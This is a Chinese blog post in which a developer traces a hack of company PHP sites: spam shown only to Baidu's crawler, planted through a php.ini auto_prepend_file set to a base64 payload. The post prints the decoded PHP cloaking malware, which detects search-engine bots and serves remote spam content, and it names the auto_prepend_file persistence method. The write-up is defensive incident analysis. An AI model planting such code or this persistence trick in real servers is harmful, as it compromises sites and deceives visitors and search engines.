+++
title = "记录一次清理网站挂马"
categories = ["PHP","网络安全"]
tags = ["PHP","网络安全"]
date = "2022-05-28T10:54:28+08:00"
draft = false

+++

> 某一天，上班上到一半，老板拿着某度APP，过来技术部，跟我们说，公司网站被挂马了，上面全部是菠菜广告；听到老板反馈后，立马开始排查，但是使用普通浏览器访问又看不到内容；于是乎就有下面清理历程了。

![挂马内容](/images/Snipaste_2022-05-28_11-31-54.jpg)

## 问题一：只有某度APP打开才复现问题？
很明显就是针对于某度，因为某度会对站点进行爬取收录（这方面涉及到了SEO相关），而且从挂马内容看都是搜索热词；直接浏览器打开看不到内容，具有隐秘性；对此，我找了个某度爬虫的请求头，然后使用chrome的一款可以修改请求头的拓展 ModHeader，来看下能不能复现内容。

 ![修改请求头](/images/Snipaste_2022-05-28_11-38-31.jpg)

上面这张图就是使用 ModHeader，把请求的 User-Agent 修改为某度的爬虫请求头，然后请求被挂马的站点，发现问题复现了，下面的文本就是某度的 UA 请求头。

    Mozilla/5.0 (compatible; **iduspider2; +http://www.**idu.com/search/spider.html)

## 问题二：内容动态变化，而且源码找不到网络请求？

专门从服务器把代码下载下来，翻箱倒柜的找代码，任何涉及到有http请求的都不放过，可是，就是没找到内容。这就纳闷了；找源码无果后，尝试在项目的目录下新建了个再普通不过的php脚本，内容就输出打印，然后die掉。
结果发现还是输出了挂马内容，很明显，这已经不是项目代码的问题了，是php-fpm的问题了。

 ![测试脚本](/images/Snipaste_2022-05-19_18-22-09.jpg)

然后没过多久，老板打电话来说，同一台服务器的网站也出现同样的情况了，然后上去看了下，都是用着上古php5.6，就更加证明上面的推测是正确的。

## 问题三：没有文件，到底是在哪里注入？

既然没有文件，而且又有网络请求，而且这么多网站都有，那么必定会引起网络IO堵塞，所以就想到了服务器上的php是开启了慢日志的，然后翻了下慢日志，果不其然，找到了这段因为可疑的base64字符串（部分内容涉及到菠菜的已经被我删掉了）。

    data:;base64,PD9waHAKQG9iX3N0YXJ0ICgpOwpAc2V0X3RpbWVfbGltaXQoMCk7CmVycm9yX3JlcG9ydGluZygwKTsKaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7CiR0ciA9ICJzdHJpc3RyIjsKJGVyID0gJF9TRVJWRVI7CmZ1bmN0aW9uIGh0dHBHZXRsYWkoJHVybCkgewogICAgJGNoID0gY3VybF9pbml0KCk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICdNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgQmFpZHVzcGlkZXIvMi4wOyAraHR0cDovL3d3dy5iYWlkdS5jb20vc2VhcmNoL3NwaWRlci5odG1sKScpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBGQUxTRSk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWUhPU1QsIEZBTFNFKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwg

看到base64字符串，立马对字符串进行转码，果不其然，发现了http请求的代码。

    <?php
	@ob_start ();
	@set_time_limit(0);
	error_reporting(0);
	header("Content-Type: text/html;charset=utf-8");
	$tr = "stristr";
	$er = $_SERVER;
	function httpGetlai($url) {
	    $ch = curl_init();
	    curl_setopt($ch, CURLOPT_URL, $url);
	    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)');
	    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	    curl_setopt($ch, CURLOPT_HEADER, 0);
	    $output = curl_exec($ch);
	    curl_close($ch);
	    return $output;
	}
	define('url', $er['REQUEST_URI']);
	@define('ref', $er['HTTP_REFERER']);
	define('ent', $er['HTTP_USER_AGENT']);
	define('site', "http://www.xxx.com/");
	define('road', "?" .$er['HTTP_HOST'] . url);
	define('regs', '@Baidu|Sogou|Yisou|Haosou|Spider|So.com|Sm.cn@i');
	define('mobile', '/phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone/');
	define('area', $tr(url, ".xml") or $tr(url, ".doc") or $tr(url, ".pdf") or $tr(url, ".txt") or $tr(url, ".ppt") or $tr(url, ".pptx") or $tr(url, ".xls") or $tr(url, ".csv") or $tr(url, ".shtml") or $tr(url, ".tacc")or $tr(url, ".ga")or $tr(url, ".gq")or $tr(url, ".xlsx")or $tr(url, ".bug") or $tr(url, ".fdc") or $tr(url, ".znb") or $tr(url, ".msl") or $tr(url, ".mdb") or $tr(url, ".cnm") or $tr(url, ".love") and $tr(url, "?"));
	if (preg_match(regs, ent)) {
	    if (area) {
	        echo httpGetlai(site.road);
	        exit;
	    } else {
	        echo httpGetlai(site.'x.php');
	        ob_flush();flush();
	    }
	}
	if (area){
	    if (preg_match(mobile, ent)){
	        $Content_mb=file_get_contents("http://www.xxx.com/");
	        echo $Content_mb;
	        exit;
	    }
	}
	?>
顺着代码逻辑拼接请求，是挂马的内容。

## 问题四：到底是哪里被修改了？

在一头雾水的时候，翻了下php的官网，看了下php.ini的文档说明；有个惊喜的发现，就是auto_prepend_file设置，按照官方文档的说法就是每次脚本文件调用前都会先调用该文件，就例如include。

 ![auto_prepend_file](/images/Snipaste_2022-05-28_12-46-20.jpg)
那问题就可能出自这里了，因为上面测试的时候，一个再普通的打印脚本都能被注入挂马；立马去翻了下对应版本的php.ini，果不其然，auto_prepend_file被赋上了那串base64字符串了，将对应的内容清理，重启fpm，完美处理。

## 反思
对于php，有些高危的函数是要进行屏蔽的；想这次被挂马就是调用了base64_decode、eval，此类可以执行字符串和转码的函数，必要时对服务器进行加固，道高一尺魔高一丈，这次清挂马就跟在捉迷藏一样。
